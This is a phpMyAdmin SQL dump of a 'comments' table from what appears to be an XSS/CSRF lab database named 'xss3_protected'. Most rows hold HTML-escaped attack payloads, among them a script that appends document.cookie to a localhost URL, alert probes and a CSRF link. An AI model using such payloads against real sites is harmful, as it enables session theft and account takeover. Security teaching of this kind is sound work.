-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: May 31, 2021 at 03:43 PM
-- Server version: 10.4.17-MariaDB
-- PHP Version: 8.0.2

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `xss3_protected`
--

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `name` varchar(200) DEFAULT NULL,
  `summary` varchar(200) DEFAULT NULL,
  `comment` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `name`, `summary`, `comment`) VALUES
(1, NULL, NULL, '&lt;script&gt;document.write(‘&lt;base href=“http://localhost/dashboard/unprotectedshop/change.php?\' + document.cookie + ‘ “/&gt;’);&lt;/script&gt;'),
(2, NULL, NULL, '	\r\n&lt;b onmouseover=alert(&quot;Wufff!&quot;)&gt;click me!&lt;/b&gt;'),
(3, NULL, NULL, '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'),
(4, NULL, NULL, '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'),
(5, NULL, NULL, '&lt;a href=&quot;http://localhost/dashboard/protectedshopCSRFattack/change.php&quot;&gt;CSRF attack&lt;/a&gt;'),
(6, NULL, NULL, '&lt;h1&gt;shop&lt;/h1&gt;');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
